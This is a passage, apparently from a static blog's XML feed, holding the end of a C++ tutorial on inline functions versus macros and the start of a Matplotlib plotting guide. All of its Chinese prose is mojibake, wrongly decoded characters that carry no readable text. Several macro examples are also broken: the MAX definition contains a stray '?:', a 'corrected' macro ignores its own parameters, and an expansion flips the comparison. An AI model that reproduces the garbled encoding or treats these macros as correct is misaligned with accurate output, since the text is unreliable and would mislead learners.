class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>å“¦è±ï¼Œå†…è”å‡½æ•°åšçš„äº‹æƒ…å°±æ˜¯åœ¨ç¨‹åºè°ƒç”¨çš„æ—¶å€™æŠŠä»£ç æ›´æ¢äº†ã€‚æ‰€æœ‰ä¸Šé¢<code>cout&lt;&lt;max(a,b)&lt;&lt;endl;</code>çš„æ•ˆæœç­‰ä»·äº<code>cout&lt;&lt;a &gt; b ? a:b&lt;&lt;endl;</code>ã€‚</li></ul><p>é™¤äº†ä¸Šé¢çš„å®šä¹‰æ–¹å¼ï¼Œè¿˜æœ‰ç±»å†…çš„å‡½æ•°ä¼šè¢«éšå¼å®šä¹‰æˆå†…è”å‡½æ•°ï¼Œå…·ä½“å¦‚ä¸‹ï¼š<br><div class="code-wrapper"><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// å£°æ˜1ï¼ˆåŠ  inlineï¼Œå»ºè®®ä½¿ç”¨ï¼‰ï¼Œå…‰å£°æ˜æ— æ³•å†…è”ï¼Œéœ€è¦åœ¨å®šä¹‰ä¸­æ·»åŠ inline</span><span class="token keyword">inline</span> <span class="token keyword">int</span> <span class="token function">functionName</span><span class="token punctuation">(</span><span class="token keyword">int</span> first<span class="token punctuation">,</span> <span class="token keyword">int</span> second<span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// å£°æ˜2ï¼ˆä¸åŠ  inlineï¼‰</span><span class="token keyword">int</span> <span class="token function">functionName</span><span class="token punctuation">(</span><span class="token keyword">int</span> first<span class="token punctuation">,</span> <span class="token keyword">int</span> second<span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// å®šä¹‰</span><span class="token keyword">inline</span> <span class="token keyword">int</span> <span class="token function">functionName</span><span class="token punctuation">(</span><span class="token keyword">int</span> first<span class="token punctuation">,</span> <span class="token keyword">int</span> second<span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">/****/</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// ç±»å†…å®šä¹‰ï¼Œéšå¼å†…è”</span><span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> <span class="token function">doA</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>         <span class="token comment">// éšå¼å†…è”</span><span class="token punctuation">&#125;</span><span class="token comment">// ç±»å¤–å®šä¹‰ï¼Œéœ€è¦æ˜¾å¼å†…è”</span><span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> <span class="token function">doA</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">inline</span> <span class="token keyword">int</span> <span class="token class-name">A</span><span class="token operator">::</span><span class="token function">doA</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>   <span class="token comment">// éœ€è¦æ˜¾å¼å†…è”</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></p><p>è¿™æ ·åˆæœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿ</p><h1 id="å†…è”å‡½æ•°æœ‰å•¥ç”¨"><a href="#å†…è”å‡½æ•°æœ‰å•¥ç”¨" class="headerlink" title="å†…è”å‡½æ•°æœ‰å•¥ç”¨"></a>å†…è”å‡½æ•°æœ‰å•¥ç”¨</h1><p>å¯¹æ¯”å†…è”å‡½æ•°å’Œæ™®é€šå‡½æ•°ï¼Œåœ¨æ•ˆæœä¸Šä¸¤è€…å®ç°ä¸€è‡´ï¼Œä½†æ˜¯åœ¨æ•ˆç‡ä¸Šå†…è”å‡½æ•°è¦æ›´èƒœä¸€ç­¹ã€‚ç©¶å…¶åŸå› ï¼Œéœ€è¦å…ˆç†è§£å‡½æ•°è°ƒç”¨çš„è¿‡ç¨‹ï¼š</p><ul><li>å‡½æ•°è°ƒç”¨è¿‡ç¨‹</li></ul><ol><li>ç¨‹åºéœ€è¦å­˜å‚¨å½“å‰åœ°å€ï¼Œä»¥ä¾¿è°ƒç”¨ç»“æŸåè¿”å›ç»§ç»­æ‰§è¡Œ</li><li>ç¨‹åºå°†ä¼ å…¥å‡½æ•°çš„å‚æ•°å‹æ ˆ</li><li>ç¨‹åºè·³åˆ°è·³åˆ°æ ‡è®°å‡½æ•°èµ·ç‚¹çš„å†…å­˜å•å…ƒï¼Œæ‰§è¡Œå‡½æ•°ä»£ç </li><li>å‡½æ•°è°ƒç”¨ç»“æŸåï¼Œå°†æ ˆæ¸…ç©ºï¼Œè¿”å›åˆ°ä¹‹å‰å­˜å‚¨çš„åœ°å€ç»§ç»­æ‰§è¡Œ</li></ol><p>è€Œå†…è”å‡½æ•°å°±ç®€å•å¤šäº†ï¼Œç›¸å½“äºç›´æ¥<code>copy</code>ä¸€ä»½å‡½æ•°ä½“å†…ä»£ç ï¼Œåœ¨æ‰§è¡Œåˆ°çš„æ—¶å€™ç›´æ¥æŒ‰ç…§ä»£ç é¡ºåºæ‰§è¡Œï¼Œçœå»äº†è®¸å¤šå‡½æ•°è°ƒç”¨è¿‡ç¨‹ï¼ŒèŠ‚çœäº†æ—¶é—´ã€‚</p><p>è¯¶ï¼Œæ˜¯ä¸æ˜¯å’Œ<strong>å®</strong>æœ‰ç‚¹åƒå•Šï¼Œä¾‹å¦‚æˆ‘ä»¬ä¸‹é¢çš„å®å®šä¹‰ï¼š<br><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">MAX</span><span class="token expression"><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>  a<span class="token operator">></span>b<span class="token operator">?</span><span class="token operator">:</span>a<span class="token operator">:</span>b</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><br>å®ç°äº†å’Œæˆ‘ä»¬ä¸Šé¢ä¾‹å­ä¸€æ ·çš„æ•ˆæœã€‚</p><p>é‚£ä¸ºä»€ä¹ˆä¸ç›´æ¥ç”¨å®ï¼Ÿè¿˜è¦æ•´ä¸ªå†…è”å‡½æ•°ã€‚é¦–å…ˆï¼Œå®èƒ½å¤Ÿè¡¨è¾¾çš„æ„æ€æœ‰é™ï¼Œé€šå¸¸æ˜¯ä¸€è¡Œçš„è¡¨è¾¾å¼ã€‚å…¶æ¬¡ï¼Œç”¨å®çš„å®‰å…¨æ€§ä¸é«˜ï¼Œå®¹æ˜“å‡ºé”™ã€‚</p><p>è¿˜æ˜¯ä¸Šé¢çš„ä¾‹å­ï¼Œå‡è®¾å®šä¹‰å®å¦‚ä¸‹ï¼š<br><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">MAX</span><span class="token expression"><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>  a<span class="token operator">></span>b<span class="token operator">?</span><span class="token operator">:</span>a<span class="token operator">:</span>b</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><br>é‚£ä¹ˆè¯­å¥<br><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">res <span class="token operator">=</span> <span class="token function">MAX</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><br>ä¼šè¢«é¢„å¤„ç†å™¨æ‰©å±•ä¸º<br><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">res <span class="token operator">=</span> i <span class="token operator">></span> j<span class="token operator">?</span> i<span class="token operator">:</span>j<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><br>ç”±äº+çš„ä¼˜å…ˆçº§é«˜äºï¼Ÿï¼Œå› æ­¤æœ€ç»ˆæ¯”è¾ƒç»“æœä¸æˆ‘ä»¬æœŸæœ›ä¸ç¬¦ã€‚<br>é‚£å¦‚æœæŠŠå®ä¿®æ”¹ä¸º<br><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">MAX</span><span class="token expression"><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span> <span class="token punctuation">(</span>i <span class="token operator">></span> j<span class="token operator">?</span> i<span class="token operator">:</span>j<span class="token punctuation">)</span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><br>ä»ç„¶å­˜åœ¨é—®é¢˜ï¼Œä¾‹å¦‚<br><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">res <span class="token operator">=</span> <span class="token function">MAX</span><span class="token punctuation">(</span>i<span class="token operator">++</span><span class="token punctuation">,</span>j<span class="token punctuation">)</span>res <span class="token operator">=</span> <span class="token punctuation">(</span>i<span class="token operator">++</span> <span class="token operator">&lt;</span> j<span class="token operator">?</span> i<span class="token operator">++</span><span class="token operator">:</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// iè¢«+äº†ä¸¤æ¬¡</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div><br>åŒæ—¶ï¼Œå®æ— æ³•è°ƒè¯•ï¼Œä½†å†…è”å‡½æ•°å¯ä»¥ã€‚åœ¨ç¨‹åºçš„è°ƒè¯•ç‰ˆæœ¬ï¼Œå†…è”å‡½æ•°å¹¶æ²¡æœ‰çœŸæ­£å†…è”ï¼Œå°±åƒæ™®é€šå‡½æ•°ä¸€æ ·å®ç°è°ƒè¯•ï¼Œåœ¨ç¨‹åºçš„å‘è¡Œç‰ˆæœ¬ï¼Œç¼–è¯‘å™¨æ‰ä¼šå®ç°çœŸæ­£å†…è”ã€‚</p><p>ç”±æ­¤ï¼Œæˆ‘ä»¬å¾—åˆ°å†…è”å‡½æ•°çš„å‡ ä¸ªä½œç”¨ï¼š</p><ol><li>æå‡ä»£ç æ‰§è¡Œæ•ˆç‡ï¼Œä¸éœ€è¦è·³è½¬è¿›è¡Œå‡½æ•°è°ƒç”¨ï¼Œçœå»å‚æ•°å‹æ ˆã€æ ˆå¸§å¼€è¾Ÿä¸å›æ”¶ï¼Œç»“æœè¿”å›ç­‰ã€‚</li><li>ç›¸æ¯”äºå®ï¼Œæœ‰ç±»å‹æ£€æŸ¥ï¼Œå®‰å…¨æ€§æ›´é«˜ï¼Œå…·æœ‰ä¸€èˆ¬å‡½æ•°ç‰¹æ€§ï¼Œå¯è°ƒè¯•</li></ol><h1 id="å•¥æƒ…å†µä¸‹ä½¿ç”¨å†…è”å‡½æ•°"><a href="#å•¥æƒ…å†µä¸‹ä½¿ç”¨å†…è”å‡½æ•°" class="headerlink" title="å•¥æƒ…å†µä¸‹ä½¿ç”¨å†…è”å‡½æ•°"></a>å•¥æƒ…å†µä¸‹ä½¿ç”¨å†…è”å‡½æ•°</h1><p>æ—¢ç„¶å†…è”å‡½æ•°é‚£ä¹ˆå¥½ï¼Œå…¨éƒ¨å‡½æ•°æ”¹æˆå†…è”å‡½æ•°ä¸å¥½å—ï¼Ÿå†…è”å‡½æ•°è™½ç„¶çœç•¥äº†å‡½æ•°çš„ä¸€èˆ¬æ­¥éª¤ï¼Œä½†å…¶æ¯æ¬¡è°ƒç”¨éƒ½ä¼šcopyä¸€ä»½å‰¯æœ¬çš„ç‰¹æ€§ä½¿å¾—æ•´ä½“å‡½æ•°ä»£ç æ•°é‡å¢åŠ ï¼Œæ¶ˆè€—æ›´å¤šç©ºé—´ã€‚</p><p>ä¸‹é¢çš„æƒ…å†µä¸é€‚åˆä½¿ç”¨å†…è”ï¼š</p><ol><li>å‡½æ•°ä½“ä»£ç è¿‡é•¿ï¼Œå†…è”ä¼šä½¿å¾—ä»£ç è†¨èƒ€è¿‡å¤§</li><li>å‡½æ•°ä½“å†…å­˜åœ¨å¾ªç¯æˆ–å…¶ä»–å¤æ‚ç»“æ„ï¼Œæ‰§è¡Œå‡½æ•°ä½“å†…ä»£ç çš„å¼€é”€è¿œå¤§äºå‡½æ•°è°ƒç”¨ï¼Œæ²¡å¿…è¦å†…è”</li></ol><p>ä¸ªäººç†è§£ï¼Œå†…è”å‡½æ•°åº”è¯¥è¢«è§†ä½œç®€æ˜“å·¥å…·å‡½æ•°ï¼Œå¯¹äºä¸€äº›é‡å¤åˆ©ç”¨ç‡é«˜ï¼Œä»£ç æ•°é‡è¾ƒå°‘çš„åŠŸèƒ½ï¼ˆä¾‹å¦‚æ¯”å¤§å°ï¼Œäº¤æ¢ä½ç½®ï¼‰ï¼Œå¯ä»¥é‡‡ç”¨å†…è”æé«˜æ•ˆç‡ã€‚</p><p>å¦å¤–ï¼Œå†…è”å‡½æ•°åº”å½“æ”¾åœ¨å¤´æ–‡ä»¶(*.h)ä¸­ï¼Œä¸€æ–¹é¢å¯ä»¥å’Œæºæ–‡ä»¶çš„åŠŸèƒ½å‡½æ•°åˆ†ç¦»ï¼Œå¦ä¸€æ–¹é¢æ–¹ä¾¿è¢«æ‰€æœ‰æºæ–‡ä»¶ä½¿ç”¨ï¼ˆä¸éœ€è¦æ¯ä¸ªæºæ–‡ä»¶ä¸€ä»½æ‹·è´ï¼‰ã€‚</p><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><ul><li><a href="https://blog.csdn.net/BjarneCpp/article/details/76044493">https://blog.csdn.net/BjarneCpp/article/details/76044493</a></li><li><a href="https://interview.huihut.com/#/?id=inline-%e5%86%85%e8%81%94%e5%87%bd%e6%95%b0">https://interview.huihut.com/#/?id=inline-%e5%86%85%e8%81%94%e5%87%bd%e6%95%b0</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>c++</category>
      
    </categories>
    
    
    <tags>
      
      <tag>c++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€ŠPythonç»˜å›¾åˆ©å™¨ã€‹ï¼šMatplotlibä½¿ç”¨æ•™ç¨‹</title>
    <link href="/article/65005.html"/>
    <url>/article/65005.html</url>
    
    <content type="html"><![CDATA[<h1 id="1-å‰è¨€"><a href="#1-å‰è¨€" class="headerlink" title="1. å‰è¨€"></a>1. å‰è¨€</h1><p>æœ¬æ–‡æ˜¯Matplotlibåº“çš„å­¦ä¹ ä½¿ç”¨æ–‡ç« ï¼ŒåŒ…å«<code>Matplotlib</code>çš„ä»‹ç»ï¼Œå®‰è£…ä»¥åŠå¦‚ä½•ç»˜å›¾ç­‰è¯¦ç»†çš„æ•™ç¨‹ã€‚ä¹Ÿå¯ä»¥ä½œä¸º<code>Matplotlib</code>ç»˜å›¾æ‰‹å†Œï¼Œåœ¨éœ€è¦çš„ä½¿ç”¨ç¿»é˜…æŸ¥çœ‹ã€‚ </p><h1 id="2-Matplotlibç®€ä»‹"><a href="#2-Matplotlibç®€ä»‹" class="headerlink" title="2. Matplotlibç®€ä»‹"></a>2. Matplotlibç®€ä»‹</h1><p><code>Matplotlib</code>å—<code>Matlab</code>å¯å‘ï¼ˆç»˜å›¾æ–¹å¼ååˆ†ç›¸ä¼¼ï¼‰ï¼Œç”±å„ç§å¯è§†åŒ–ç±»æ„æˆï¼Œå…¶å†…éƒ¨ç»“æ„ååˆ†å¤æ‚ï¼Œä¸ºäº†æ–¹ä¾¿ç”¨æˆ·ä½¿ç”¨ï¼Œæä¾›äº†<code>Matplotlib.pyplot</code>ä½œä¸ºpythonç»˜å›¾çš„å­åº“ï¼Œæä¾›ç»˜åˆ¶å„ç±»å¯è§†åŒ–å›¾å½¢çš„å‘½ä»¤ã€‚</p><blockquote><p><code>pyplot</code>ç›¸å½“äºæä¾›äº†åº•å±‚ç»˜å›¾çš„ä¸€ä¸ªå¿«æ·æ–¹å¼ï¼Œç”¨ç®€å•çš„æ–¹å¼å»è°ƒç”¨å¤æ‚æ¨¡å—  </p></blockquote><p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬é‡‡ç”¨å¦‚ä¸‹çš„æ–¹å¼å¯¼å…¥<code>pyplot</code><br><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><br>ä¸‹é¢å±•ç¤ºäº†Matplotlibç»˜åˆ¶çš„éƒ¨åˆ†å›¾å½¢ï¼š<br><img src="https://img-blog.csdnimg.cn/20200306111922750.png#pic_center =500x500" style="zoom:50%;" /></p><h1 id="3-å®‰è£…"><a href="#3-å®‰è£…" class="headerlink" title="3. å®‰è£…"></a>3. å®‰è£…</h1><p><code>Matplotlib</code>çš„å®‰è£…ååˆ†ç®€å•ï¼Œåªè¦æœ¬åœ°å®‰è£…äº†<code>python</code>ç¯å¢ƒå’Œ<code>pip</code>å®‰è£…å·¥å…·ï¼Œç”¨ä¸‹é¢çš„å‘½ä»¤å³å¯å®‰è£…:<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">pip install matplotlib<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></p><h1 id="4-ç»˜å›¾åŸºç¡€"><a href="#4-ç»˜å›¾åŸºç¡€" class="headerlink" title="4. ç»˜å›¾åŸºç¡€"></a>4. ç»˜å›¾åŸºç¡€</h1><h2 id="4-1-plot-å‡½æ•°"><a href="#4-1-plot-å‡½æ•°" class="headerlink" title="4.1 plot()å‡½æ•°"></a>4.1 plot()å‡½æ•°</h2><p><code>plot(x,y,format_string,**kwargs)</code>æ˜¯<code>pyplot</code>ç»˜å›¾çš„åŸºç¡€å‡½æ•°ï¼Œå…¶ä¸­å„å‚æ•°å«ä¹‰å¦‚ä¸‹: </p><ul><li><code>x</code>:Xè½´æ•°æ®ï¼Œåˆ—è¡¨æˆ–æ•°ç»„(å•æ¡æ›²çº¿å¯é€‰)</li><li><code>y</code>:Yè½´æ•°æ®ï¼Œåˆ—è¡¨æˆ–æ•°ç»„</li><li><code>format_string</code>:æ§åˆ¶æ›²çº¿çš„æ ¼å¼å­—ç¬¦ä¸²ï¼Œç”¨äºå¡«å……æ›²çº¿ä¿¡æ¯(å¯é€‰)ï¼ŒåŒ…å«<strong>é¢œè‰²ï¼Œé£æ ¼ï¼Œæ ‡è®°</strong>ä¸‰ç§å­—ç¬¦ï¼Œå¯¹åº”å¯é€‰å‚æ•°å¦‚ä¸‹ï¼š<table><tr><td><strong>å­—ç¬¦ç±»å‹</strong></td><td><strong>å‚æ•°</strong></td><td><strong>è¯´æ˜</strong></td></tr><tr>                                   <td rowspan="10">é¢œè‰²å­—ç¬¦</td>  <td>'b'</td>  <td>è“è‰²</td></tr><tr>                                   <td>'g'</td>  <td>ç»¿è‰²</td></tr><tr>                                   <td>'r'</td>  <td>çº¢è‰²</td></tr> <tr>                                   <td>'c'</td>  <td>é’ç»¿è‰²</td></tr> <tr>                                   <td>'m'</td>  <td>æ´‹çº¢è‰²</td></tr><tr>                                   <td>'y'</td>  <td>é»„è‰²</td></tr><tr>                                   <td>'k'</td>  <td>é»‘è‰²</td></tr><tr>                                   <td>'w'</td>  <td>ç™½è‰²</td></tr><tr>                                   <td>'#000000'</td>  <td>æŒ‰RGBå–è‰²</td></tr><tr>                                   <td>'0.6'</td>  <td>ç°åº¦å€¼</td></tr><tr>                                   <td rowspan="5">é£æ ¼å­—ç¬¦</td>  <td>'-'</td>  <td>å®çº¿</td></tr><tr>                                   <td>'--'</td>  <td>ç ´æŠ˜çº¿</td></tr><tr>                                   <td>'-.'</td>  <td>ç‚¹åˆ’çº¿</td></tr><tr>                                   <td>':'</td>  <td>è™šçº¿</td></tr><tr>                                   <td>'' ''</td>  <td>æ— çº¿æ¡</td></tr><tr>                                   <td rowspan="3">æ ‡è®°å­—ç¬¦</td>  <td>'.'</td>  <td>ç‚¹æ ‡è®°</td></tr><tr>                                   <td>'o'</td>  <td>å®å¿ƒåœˆæ ‡è®°</td></tr><tr>                                   <td>'^'</td>  <td>ä¸Šä¸‰è§’æ ‡è®°</td></tr> </table></li></ul><blockquote><p>æ ‡è®°å­—ç¬¦è¿˜æœ‰å¾ˆå¤šç§ç±»å‹ï¼Œè¿™é‡Œä¸ä¸€ä¸€åˆ—å‡ºï¼Œä¸‹é¢æ˜¯å‡ ä¸ªæ›²çº¿æ ·ä¾‹:<br><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> npx <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>x<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'b-.'</span><span class="token punctuation">,</span>x<span class="token punctuation">,</span>x<span class="token operator">*</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">'r*'</span><span class="token punctuation">,</span>x<span class="token punctuation">,</span>x<span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">'y-.^'</span><span class="token punctuation">)</span>  <span class="token comment"># 1:è“è‰²å®çº¿ç‚¹æ ‡è®°ï¼Œ2:çº¢è‰²`*`æ ‡è®°ï¼Œ3:é»„è‰²è™šçº¿ä¸Šä¸‰è§’æ ‡è®°</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><br><img src="https://img-blog.csdnimg.cn/20200306112029442.png#pic_center =500x400" style="zoom:50%;" /></p></blockquote><ul><li><code>**kwargs</code>:æ›´å¤šçš„æ›²çº¿å‚æ•°(x,y,format_string)   </li></ul><h3 id="4-1-1-ä¸­æ–‡æ˜¾ç¤º"><a href="#4-1-1-ä¸­æ–‡æ˜¾ç¤º" class="headerlink" title="4.1.1 ä¸­æ–‡æ˜¾ç¤º"></a>4.1.1 ä¸­æ–‡æ˜¾ç¤º</h3><p><code>pyplot</code>æ ‡ç­¾æœ¬èº«å¹¶ä¸æ”¯æŒä¸­æ–‡å­—ä½“ï¼Œå¯ä»¥é€šè¿‡åœ¨labelä¸­æ·»åŠ <code>fontproperties</code>å±æ€§ä¿®æ”¹å­—ä½“ï¼Œ<code>fontsize</code>è®¾ç½®å­—ä½“å¤§å°ï¼Œä½†é¦–å…ˆéœ€è¦ä¿è¯æœ‰å¯¹åº”å­—ä½“ï¼Œå¦‚æœæç¤ºæ²¡æœ‰ï¼Œåˆ™éœ€ä¸‹è½½å¹¶è¿›è¡Œå®‰è£…ï¼Œå…·ä½“å¯ä»¥å‚è€ƒ<a href="https://blog.csdn.net/q1148013214/article/details/81172446">è¿™ç¯‡æ–‡ç« </a>ã€‚</p><blockquote><p>jupyter éœ€è¦é‡å¯ä¸€ä¸‹æœåŠ¡æ˜¾ç¤º</p></blockquote><p>ä¸­æ–‡æ˜¾ç¤ºæ ·ä¾‹å¦‚ä¸‹ï¼š<br><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> npx <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>xlabel<span class="token punctuation">(</span><span class="token string">'æˆ‘æ˜¯æ¨ªè½´'</span><span class="token punctuation">,</span>fontproperties<span class="token operator">=</span><span class="token string">'Simhei'</span><span class="token punctuation">,</span>fontsize<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>ylabel<span class="token punctuation">(</span><span class="token string">'æˆ‘æ˜¯çºµè½´'</span><span class="token punctuation">,</span>fontproperties<span class="token operator">=</span><span class="token string">'Simhei'</span><span class="token punctuation">,</span>fontsize<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>x<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'b-.'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></p><p><img src="https://img-blog.csdnimg.cn/2020030611205413.png#pic_center =500x400" style="zoom:50%;" /></p><blockquote><p>æ˜¾ç¤ºä¸­æ–‡æ ‡ç­¾çš„æ–¹æ³•è¿˜æœ‰ä¿®æ”¹<code>rcParams</code>å‚æ•°ï¼Œä½†è¿™ç§æ–¹å¼æ˜¯å…¨å±€å¼çš„ä¿®æ”¹ï¼Œç»Ÿä¸€æ‰€æœ‰å­—ä½“ï¼Œæ ¹æ®è‡ªèº«éœ€è¦å–èˆã€‚å®ç°ä¹Ÿå¾ˆå®¹æ˜“ï¼Œåœ¨ç¨‹åºå¼€å¤´æ·»åŠ å¦‚ä¸‹ä»£ç ï¼š<br><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python">plt<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.sans-serif'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'SimHei'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></p></blockquote><h3 id="4-1-2-æ–‡æœ¬æ˜¾ç¤º"><a href="#4-1-2-æ–‡æœ¬æ˜¾ç¤º" class="headerlink" title="4.1.2 æ–‡æœ¬æ˜¾ç¤º"></a>4.1.2 æ–‡æœ¬æ˜¾ç¤º</h3><p>é™¤äº†ç»˜å›¾ä¹‹å¤–ï¼Œæˆ‘ä»¬è¿˜éœ€è¦ç»™å›¾åƒåšä¸€å®šçš„è¯´æ˜æ–‡å­—ä¿¡æ¯ï¼Œä¸€èˆ¬åŒ…æ‹¬å¦‚ä¸‹å‡ ä¸ªæ–‡æœ¬æ˜¾ç¤ºå‡½æ•°ï¼š</p><div class="table-container"><table><thead><tr><th>å‡½æ•°</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>plt.xlabel()</td><td>xè½´æ–‡å­—</td></tr><tr><td>plt.ylabel()</td><td>yè½´æ–‡å­—</td></tr><tr><td>plt.title()</td><td>å›¾åƒæ ‡é¢˜æ–‡æœ¬</td></tr><tr><td>plt.text()</td><td>ä»»æ„ä½ç½®æ·»åŠ æ–‡æœ¬</td></tr><tr><td>plt.annotate()</td><td>æ·»åŠ å¸¦ç®­å¤´çš„æ³¨é‡Š</td></tr></tbody></table></div><p>ä¸‹é¢æ˜¯ä¸€ä¸ªè¾ƒä¸ºè¯¦ç»†çš„ä¾‹å­ï¼š<br><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltx <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">0.1</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>xlabel<span class="token punctuation">(</span><span class="token string">'æˆ‘æ˜¯æ¨ªè½´'</span><span class="token punctuation">,</span>fontsize<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>ylabel<span class="token punctuation">(</span><span class="token string">'æˆ‘æ˜¯çºµè½´'</span><span class="token punctuation">,</span>fontsize<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'b'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'æ­£å¼¦æ›²çº¿$y=sin(2\pi x)$'</span><span class="token punctuation">,</span>fontsize<span class="token operator">=</span><span class="token number">12</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>text<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token 